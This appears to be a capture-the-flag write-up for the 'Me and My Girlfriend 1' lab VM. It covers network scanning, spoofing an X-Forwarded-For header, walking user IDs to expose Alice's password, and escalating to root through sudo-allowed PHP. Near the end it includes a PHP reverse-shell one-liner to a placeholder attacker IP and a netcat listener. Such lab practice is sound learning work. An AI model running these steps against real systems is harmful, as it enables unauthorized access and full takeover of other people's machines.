---
title: "Me and My Girlfriend 1 Writeup"
date: 2020-02-16T19:09:19+11:00
description: "Writeup for Me and My Girlfriend 1 box"
draft: false
displayInLine: true
displayInMenu: true
draft: false
---

# Me and My Girlfriend Write-up 1

For this box, the overall objective is the break into Alice's account, find her secret (flag1.txt) and then gain root access (flag2.txt). When booting up the VM your greeted with a standard ubuntu login. Since no SQL injections work on this login, I need to find the IP of this machine to begin an NMAP scan.

To do this, I use the following command on my kali machine:

    netdiscover -r 192.168.220.0
    
    # -r = range of ips

This will allow me to detect any IP that exists in this range.

![Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled.png](Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled.png)

As seen there are 4 IPs shown, only one of these is the ip of the alice machine. since *.1* and *.254* are the network and broadcast ip respectively, these leaves *.156* and *.2* but *.2* is most likely the gateway address.

I can further test this by performing and NMAP scan on the ip 192.168.220.156.

    nmap -A 192.168.220.156

![Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%201.png](Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%201.png)

Boom so now I know that there are 2 open ports I can use. But one of them being port 80 with an apache version shows that there's a website. So now I'm going to see if i can access the website normally.

![Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%202.png](Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%202.png)

So we are greeted with this kind message telling that the site can only be accessed locally. So lets see if theres anything else.

![Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%203.png](Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%203.png)

There's a comment here saying that we should look up how to use x-forwarded-for

![Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%204.png](Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%204.png)

So what we've gathered is that X-Forwarded-For is a HTTP header field. So from this lets have a look at the header field for the website by using **Burp Suite**

So before setting it up I have to make the necessary changes to Firefox

![Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%205.png](Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%205.png)

![Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%206.png](Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%206.png)

![Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%207.png](Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%207.png)

- So we have to change the proxy setting in Firefox to be the same as the proxy listener in Burp Suite. By going to the bottom of preferences in Network Proxy and changing the configure proxy to manual and inputting the HTTP Proxy as the same ip and Port: *127.0.0.1 8080 .*

Now that this is configured we can refresh the page and capture the page.

![Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%208.png](Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%208.png)

So once we captured it, we can see the data it is able to capture in the refresh. If we navigate to headers we can see what information the headers have.

![Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%209.png](Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%209.png)

This is the header info for the site. So if we were to insert the X-Forwarder-For somewhere we should able to access local. 

![Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%2010.png](Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%2010.png)

Inserting that should allow us to gain access to local given the two hints.

    X-Forwarded-For: localhost

![Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%2011.png](Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%2011.png)

![Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%2012.png](Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%2012.png)

Perfect, I gained access to the proper page. Now lets have alook around.

There was nothing of notability so now Im going to register to see if there anything else.

![Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%2013.png](Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%2013.png)

Now that I've registered I'm going to look around for potential clues.

![Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%2014.png](Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%2014.png)

I started playing around with the user_id in the url to see if it changes anything. and so it does. Now im just going to input random numbers and see where it goes.

![Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%2015.png](Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%2015.png)

Bingo, Alice. Now that we found her profile, we need to find out the password.

![Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%2016.png](Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%2016.png)

In the source code weve got the username and password,

    alice
    4lice3

Now to use this password on the Alice machine.

![Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%2017.png](Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%2017.png)

Were in, now lets dig in and find the flag

![Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%2018.png](Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%2018.png)

So now we've got the first flag within a hidden file. Now we need to get root access to get the second flag.

So I didn't know where to go from here so I tried to find out what sudo command that Alice can use.

![Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%2019.png](Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%2019.png)

    sudo -l
    -l = list of If no command is specified, list the allowed (and forbidden) commands for the invoking user (or the user specified by the -U option) on the current host.

Using the above command, I can determine that the Alice user can use the following command as root:

    /usr/bin/php

Now I need to figure a way to exploit this to gain root access.

After doing some researching into it, I found a cheat sheet for reverse shells and found this command:

    php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'

This along side netcat should allow me to gain access through the kali machine using the following command

    nc -nvlp 80

![Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%2020.png](Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%2020.png)

![Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%2021.png](Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%2021.png)

![Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%2022.png](Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%2022.png)

Boom now I'm root, now I just need to navigate to the second flag.

![Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%2023.png](Me%20and%20My%20Girlfriend%20Write%20up%201/Untitled%2023.png)